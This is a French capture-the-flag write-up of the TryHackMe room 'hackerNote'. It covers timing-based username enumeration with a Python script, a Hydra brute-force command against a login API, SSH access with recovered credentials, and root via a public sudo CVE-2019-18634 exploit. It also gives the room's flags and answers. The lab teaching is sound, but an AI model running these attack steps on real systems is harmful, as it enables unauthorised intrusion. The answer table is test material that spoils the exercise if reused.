# TryHackMe: hackerNote

**Objectif :** exploiter une application web vulnerable a l'enumeration d'utilisateurs par timing, construire une wordlist ciblee a partir d'un indice de mot de passe, obtenir un acces SSH, puis escalader les privileges via une faille `sudo`.

---

## Introduction

La room **hackerNote** est beaucoup plus interessante qu'un simple bruteforce. Elle repose sur une erreur logique cote backend : le serveur ne verifie le mot de passe que si le nom d'utilisateur existe deja. Ce detail cree une difference de temps mesurable entre un login invalide et un login avec utilisateur valide mais mauvais mot de passe. Toute la room est construite sur cette observation.

Les grandes phases sont :

1. Reconnaissance reseau
2. Analyse de l'application
3. Enumeration d'utilisateur par timing
4. Bruteforce cible du mot de passe
5. Recuperation des credentials SSH
6. Privilege escalation via `CVE-2019-18634`

---

## Task 1: Reconnaissance

### Question 1: Which ports are open? (in numerical order)

Je commence avec un scan de version :

```bash
nmap -sC -sV <IP>
```

Sortie utile :

```text
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http
```

### Reponse

**Open ports:** `22,80,8080`

### Question 2: What programming language is the backend written in?

Le service fingerprinted sur `80` et `8080` ressort comme serveur HTTP Golang.

Exemple de sortie Nmap :

```text
Golang net/http server
```

### Reponse

**Backend language:** `go`

---

## Task 2: Investigate

### Question 1: Create your own user account

Je navigue sur `http://<IP>/`, puis j'ouvre le formulaire d'inscription. Je cree un compte de test pour comprendre le comportement de l'application.

### Reponse

**Create your own user account:** `Done`

### Question 2: Log in to your account

Je me connecte avec ce compte de test pour observer les routes, les messages d'erreur et les requetes effectuees dans le navigateur.

### Reponse

**Log in to your account:** `Done`

### Question 3: Try and log in to an invalid user account

Je me deconnecte, puis je teste une connexion avec un utilisateur inexistant. Le message renvoye est :

```text
Invalid Username Or Password
```

Surtout, la reponse est quasi immediate.

### Reponse

**Try and log in to an invalid user account:** `Done`

### Question 4: Try and log in to your account, with an incorrect password

Je teste maintenant mon propre compte valide avec un mot de passe faux. Le message est le meme :

```text
Invalid Username Or Password
```

Mais cette fois, le serveur repond nettement plus lentement.

### Reponse

**Try and log in with an incorrect password:** `Done`

### Question 5: Notice the timing difference. This allows user enumeration

La difference de temps est l'indice central de la room :

- utilisateur inexistant = reponse quasi instantanee
- utilisateur valide + mauvais mot de passe = reponse plus lente

Le backend ne calcule le hash du mot de passe que si le username existe. On peut donc enumerer les comptes valides sans jamais connaitre leur mot de passe.

### Reponse

**Timing difference observed:** `Done`

---

## Task 3: Exploit

### Question 1: Try to write a script to perform a timing attack

En regardant l'onglet reseau du navigateur, je constate que le login envoie un POST vers :

```text
/api/user/login
```

J'ecris donc un script Python simple qui mesure le temps de reponse pour une liste de usernames :

```python
#!/usr/bin/env python3
import sys
import time
import requests

URL = "http://<IP>/api/user/login"

with open(sys.argv[1]) as f:
    usernames = [x.strip() for x in f.readlines()]

for username in usernames:
    start = time.time()
    requests.post(URL, json={"username": username, "password": "invalidPassword!"})
    end = time.time()
    print(username, round(end - start, 3))
```

Je lance ensuite le script avec une wordlist type `multiplesources-users-fabian-fingerle.de.txt`.

### Reponse

**Timing attack script:** `Done`

### Question 2: How many usernames from the list are valid?

En comparant les delais, un seul nom ressort de facon coherente.

### Reponse

**Valid usernames found:** `1`

### Question 3: What are/is the valid username(s)?

Le nom qui ressort du test de timing est :

```text
james
```

### Reponse

**Valid username:** `james`

---

## Task 4: Attack Passwords

### Question 1: Form the hydra command to attack the login API route

Une fois connecte a l'application avec `james`, je consulte l'indice de mot de passe :

```text
my favourite colour and my favourite number
```

Je pars de deux fichiers, `colors.txt` et `numbers.txt`, que je combine avec `hashcat-utils` :

```bash
./combinator.bin colors.txt numbers.txt > wordlist.txt
```

Puis je prepare la commande Hydra :

```bash
hydra -l james -P wordlist.txt <IP> http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password"
```

### Reponse

**Hydra command:**  
`hydra -l james -P wordlist.txt <IP> http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password"`

### Question 2: How many passwords were in your wordlist?

Je compte les lignes :

```bash
wc -l wordlist.txt
```

Resultat :

```text
180
```

### Reponse

**Passwords in wordlist:** `180`

### Question 3: What was the user's password?

Hydra trouve :

```text
blue7
```

### Reponse

**User password:** `blue7`

### Question 4: Login as the user to the platform

Je me connecte a l'interface avec :

- Username : `james`
- Password : `blue7`

### Reponse

**Login as the user to the platform:** `Done`

### Question 5: What's the user's SSH password?

Les notes de `james` contiennent son mot de passe SSH :

```text
dak4ddb37b
```

### Reponse

**SSH password:** `dak4ddb37b`

### Question 6: Log in as the user to SSH with the credentials you have

Je me connecte :

```bash
ssh james@<IP>
```

Password :

```text
dak4ddb37b
```

### Reponse

**Log in to SSH:** `Done`

### Question 7: What's the user flag?

Une fois dans le home de `james` :

```bash
cat user.txt
```

Flag :

```text
thm{56911bd7ba1371a3221478aa5c094d68}
```

### Reponse

**User flag:** `thm{56911bd7ba1371a3221478aa5c094d68}`

---

## Task 5: Escalate

### Question 1: What is the CVE number for the exploit?

Premier reflexe :

```bash
sudo -l
```

Je remarque que la saisie du mot de passe sudo affiche des asterisques. Cela indique l'option `pwdfeedback`, justement concernee par une faille connue :

```text
CVE-2019-18634
```

### Reponse

**CVE number:** `CVE-2019-18634`

### Question 2: Find the exploit from https://github.com/saleemrashid/ and download the files

Depuis Kali :

```bash
git clone https://github.com/saleemrashid/sudo-cve-2019-18634.git
cd sudo-cve-2019-18634
```

### Reponse

**Download exploit:** `Done`

### Question 3: Compile the exploit from Kali linux

Compilation :

```bash
make
```

### Reponse

**Compile exploit:** `Done`

### Question 4: SCP the exploit binary to the box

Transfert :

```bash
scp exploit james@<IP>:/tmp/exploit
```

### Reponse

**SCP exploit to box:** `Done`

### Question 5: Run the exploit, get root

Depuis la machine cible :

```bash
chmod +x /tmp/exploit
/tmp/exploit
whoami
```

Resultat :

```text
root
```

### Reponse

**Run exploit, get root:** `Done`

### Question 6: What is the root flag?

```bash
cat /root/root.txt
```

Flag :

```text
thm{af55ada6c2445446eb0606b5a2d3a4d2}
```

### Reponse

**Root flag:** `thm{af55ada6c2445446eb0606b5a2d3a4d2}`

---

## Recapitulatif des reponses

| Question | Reponse |
|----------|---------|
| Which ports are open? | `22,80,8080` |
| What programming language is the backend written in? | `go` |
| Create your own user account | `Done` |
| Log in to your account | `Done` |
| Try and log in to an invalid user account | `Done` |
| Try and log in with an incorrect password | `Done` |
| Notice the timing difference | `Done` |
| How many usernames are valid? | `1` |
| What valid username was found? | `james` |
| How many passwords in the wordlist? | `180` |
| What was the user's password? | `blue7` |
| What's the user's SSH password? | `dak4ddb37b` |
| What's the user flag? | `thm{56911bd7ba1371a3221478aa5c094d68}` |
| What is the CVE number? | `CVE-2019-18634` |
| What's the root flag? | `thm{af55ada6c2445446eb0606b5a2d3a4d2}` |

---

## Points cles a retenir

- Une **difference de timing** peut suffire a enumerer des utilisateurs.
- Un **indice de mot de passe** rend un bruteforce bien plus realiste qu'une attaque brute sur `rockyou`.
- Le reflexe `sudo -l` reste indispensable.
- L'option `pwdfeedback` dans `sudo` a deja mené a une vraie faille critique.

---

**Auteur :** Saad Idrissi
